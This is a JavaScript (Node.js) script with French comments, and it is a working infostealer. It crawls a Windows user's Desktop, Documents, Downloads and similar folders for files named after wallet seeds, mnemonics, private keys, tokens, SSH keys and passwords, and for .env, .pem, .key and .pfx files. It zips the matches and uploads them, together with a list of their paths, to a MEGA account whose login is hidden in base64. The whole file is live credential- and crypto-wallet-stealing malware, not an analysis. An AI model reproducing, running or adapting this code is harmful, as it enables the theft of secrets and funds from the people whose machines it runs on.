import fs from "fs";

import path from "path";

import AdmZip from "adm-zip";

console.log("Début du script de recherche sur C:");

let specialFiles = [];

// Mots-clés pour les dossiers à explorer en profondeur
const folderKeywords = [
  "Desktop",
  "Bureau",
  "Documents",
  "Document",
  "Images",
  "Videos",
  "Téléchargements",
  "Pictures",
  "Downloads",
];

// Liste des préfixes de fichiers spéciaux
const fileKeywords = [
  // Wallets / seeds
  "seed",
  "seedphrase",
  "mnemonic",
  "recovery",
  "backup",
  "wallet",
  "keystore",

  // Clés
  "private",
  "privatekey",
  "secret",
  "apikey",
  "api_key",
  "token",
  "access_token",
  "auth",
  "bearer",

  // Web3
  "solana",
  "ethereum",
  "metamask",
  "phantom",
  "trustwallet",
  "keplr",
  "ledger",
  "trezor",

  // Infra / dev
  "credentials",
  "password",
  "passwd",
  "ssh",
  "rsa",
  "dsa",
  "pgp",

  // Formats sensibles
];

// Extensions de fichiers sensibles à inclure
const sensitiveExtensions = [
  ".env",
  ".pem",
  ".key",
  ".keystore",
  ".sqlite",
  ".db",
  ".crt",
  ".pfx",
  ".jks",
];

// Fonction pour lister seulement les fichiers .json et .txt récursivement
function listFiles(dir, indent = "") {
  try {
    const items = fs.readdirSync(dir, { withFileTypes: true });
    for (const item of items) {
      const fullPath = path.join(dir, item.name);
      if (
        item.isDirectory() &&
        !["node_modules", "Lib", "cache", "site-packages"].includes(item.name)
      ) {
        listFiles(fullPath, indent);
      } else if (!item.isDirectory()) {
        const isJsonOrTxt =
          item.name.endsWith(".json") || item.name.endsWith(".txt");
        const isSensitiveExtension = sensitiveExtensions.some((ext) =>
          item.name.endsWith(ext)
        );
        if (isJsonOrTxt || isSensitiveExtension) {
          console.log(`${indent}${item.name}`);
          const matchesKeyword =
            isJsonOrTxt &&
            fileKeywords.some((kw) =>
              item.name.toLowerCase().includes(kw.toLowerCase())
            );
          if (
            (matchesKeyword || isSensitiveExtension) &&
            ![
              "vcpkg",
              "libraries",
              "WinSxS",
              ".next",
              "venv",
              "site-packages",
              "cache",
              "Lib",
              "dist-info",
              "certifi",
              "licenses",
            ].some((exclude) => fullPath.includes(exclude))
          ) {
            specialFiles.push(fullPath);
          }
        }
      }
    }
  } catch (err) {
    console.log(`${indent}Erreur d'accès: ${err.message}`);
  }
}

// Fonction pour lister récursivement les dossiers et fichiers
function listContents(dir, maxDepth = 2, currentDepth = 0) {
  if (currentDepth > maxDepth) return; // Limiter la profondeur pour éviter trop de logs
  try {
    const items = fs.readdirSync(dir, { withFileTypes: true });
    console.log(`Dossier: ${dir} (${items.length} éléments)`);
    for (const item of items) {
      const fullPath = path.join(dir, item.name);
      if (
        item.isDirectory() &&
        !["node_modules", "Lib", "cache", "site-packages"].includes(item.name)
      ) {
        console.log(`  Sous-dossier: ${item.name}`);
        if (
          folderKeywords.some((kw) =>
            item.name.toLowerCase().includes(kw.toLowerCase())
          )
        ) {
          console.log(`  Fichiers .json et .txt dans ${item.name}:`);
          listFiles(fullPath);
        } else if (currentDepth < maxDepth) {
          listContents(fullPath, maxDepth, currentDepth + 1);
        }
      } else if (!item.isDirectory()) {
        const isJsonOrTxt =
          item.name.endsWith(".json") || item.name.endsWith(".txt");
        const isSensitiveExtension = sensitiveExtensions.some((ext) =>
          item.name.endsWith(ext)
        );
        if (isJsonOrTxt || isSensitiveExtension) {
          console.log(`  Fichier: ${item.name}`);
        }
      }
    }
  } catch (err) {
    console.log(`Erreur d'accès à ${dir}: ${err.message}`);
  }
}

// Lister le contenu du dossier utilisateur
const userHome = path.join("C:\\Users", process.env.USERNAME);
console.log(`Scanning ${userHome}...`);
listContents(userHome);
console.log("Fin du scan.");

// Écrire dans wallet.json si des fichiers spéciaux trouvés
if (specialFiles.length > 0) {
  const data = JSON.stringify({ specialFiles }, null, 2);
  fs.writeFileSync("wallet.json", data);
  console.log("Fichiers spéciaux écrits dans wallet.json");

  // Créer un zip des fichiers
  const zip = new AdmZip();
  for (const file of specialFiles) {
    zip.addLocalFile(file);
  }
  zip.writeZip("files.zip");
  console.log("Fichiers zippés dans files.zip");
}

import { Storage } from "megajs";

//envoyer les fichiers via mega
(async () => {
  const email = Buffer.from(
    "dGVzdGVpbnRydXNpb25AZ21haWwuY29t",
    "base64"
  ).toString();
  const password = Buffer.from("UWRldWpmeWh1dWlyX2dmdg==", "base64").toString();
  const storage = new Storage({
    email: email,
    password: password,
    userAgent: "MyApp/1.0",
  });

  storage.on("ready", () => {
    console.log("Connecté à Mega");
    // Uploader files.zip
    const file = storage.upload("files.zip", fs.readFileSync("files.zip"));
    file.on("complete", () => console.log("files.zip uploadé sur Mega"));
    // Uploader wallet.json
    const file2 = storage.upload("wallet.json", fs.readFileSync("wallet.json"));
    file2.on("complete", () => console.log("wallet.json uploadé sur Mega"));
  });

  storage.on("error", (err) => {
    console.error("Erreur Mega :", err);
  });
})();
